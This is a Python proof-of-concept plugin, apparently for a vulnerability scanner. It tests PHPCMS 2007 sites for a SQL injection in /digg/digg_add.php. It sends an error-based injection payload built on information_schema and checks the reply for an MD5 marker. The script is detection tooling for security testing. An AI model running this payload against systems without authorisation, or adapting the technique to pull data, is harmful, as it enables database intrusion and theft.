# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0008'  # 平台漏洞编号，留空
    name = 'PHPCMS 2007 /digg_add.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-30'  # 漏洞公布时间
    desc = '''
        PHPCMS 2007 /digg_add.php mod参数未过滤带入sql语句导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = '2007'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7c1eac62-fc15-41d9-89c4-2ad3275abbd9'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data WHERE 1=2 +and(select 1 from("
                       "select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e))) from "
                       "information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema."
                       "tables group by x)a)%23")
            verify_url = '{target}'.format(target=self.target)+payload
            req = requests.get(verify_url)

            if '63e1f04640e83605c1d177544a5a0488' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
